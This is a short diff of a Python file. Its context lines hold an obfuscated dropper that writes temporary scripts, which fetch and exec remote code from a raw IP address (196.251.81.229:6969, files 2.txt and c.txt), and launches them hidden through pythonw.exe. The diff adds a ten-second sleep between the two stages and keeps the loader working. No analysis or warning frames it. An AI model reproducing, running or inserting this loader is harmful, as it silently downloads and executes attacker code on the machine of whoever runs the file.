@@ -5,6 +5,7 @@ import requests
 import os
 import uuid
 import tempfile
+import time
 
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("http://196.251.81.229:6969/2.txt").read())""")
@@ -12,6 +13,8 @@ _ttmp.close()
 
 pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
 Popen([pythonw_path, _ttmp.name])
+
+time.sleep(10)
 
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("http://196.251.81.229:6969/c.txt").read())""")
